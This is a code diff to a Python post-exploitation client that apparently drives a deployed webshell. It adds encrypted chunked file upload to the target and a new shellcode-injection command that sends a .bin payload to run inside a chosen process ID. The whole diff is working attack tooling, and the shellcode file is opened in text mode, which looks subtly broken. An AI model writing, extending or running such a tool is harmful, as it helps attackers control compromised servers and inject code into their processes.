@@ -114,6 +114,8 @@ def do_upload(session, payload: str):
     chunk_size = input('Chunk size(4096): ')
     if not chunk_size:
         chunk_size = 1024 * 4
+    else:
+        chunk_size = int(chunk_size)
 
     print_logs(f'Chunk size => {chunk_size}')
 
@@ -121,7 +123,6 @@ def do_upload(session, payload: str):
         flag = True
         read = 0
         while chunk := f.read(chunk_size):
-            read += chunk_size
 
             param_str = f'action=UPLOAD&mode=' + ('volatile' if args.volatile else 'persistent') + f'&path={dst_filepath}&buffer={base64.b64encode(chunk).decode("utf-8")}'
             class_len = len(payload_bytes)
@@ -135,6 +136,8 @@ def do_upload(session, payload: str):
             try:
                 resp_text = aes_decrypt(resp.content).decode(args.encoding)
                 percent = read / size * 100
+
+                read += int(resp_text)
 
                 print(f'Sent chunk: {len(chunk):,} bytes ({percent:6.2f}%)[{read:,}/{size:,}]', end='\r', flush=True)
             except Exception as ex:
@@ -154,7 +157,41 @@ def do_shellcode(session, payload: str):
     with open(payload, 'rb') as f:
         payload_bytes = f.read()
 
+    shellcode_path = input(f'Shellcode source (*.bin): ')
+    if not os.path.exists(shellcode_path):
+        print_error('File not found: ' + shellcode_path)
+        return
     
+    pid = input('Process ID ("exit") > ')
+    if not pid or pid == 'exit':
+        return
+    
+    pid = int(pid)
+    
+    with open(shellcode_path) as f:
+        shellcode_bytes = f.read()
+
+    param_str = f'action=SHELLCODE&mode=' + ('volatile' if args.volatile else 'persistent') + f'&pid={pid}&buffer={base64.b64encode(shellcode_bytes).decode("utf-8")}'
+    
+    class_len = len(payload_bytes)
+
+    raw_payload = struct.pack('>I', class_len) + payload_bytes + param_str.encode('utf-8')
+    encrypted_payload = aes_encrypt(raw_payload)
+
+    headers = {
+        'Content-Type': 'application/octet-stream'
+    }
+
+    resp = session.post(args.url, data=encrypted_payload, headers=headers)
+
+    try:
+        resp_text = aes_decrypt(resp.content).decode(args.encoding)
+        print(resp_text)
+    except Exception as ex:
+        print(resp.text)
+
+    return
+
 
 def do_reflective(session, payload: str):
     with open(payload, 'rb') as f:
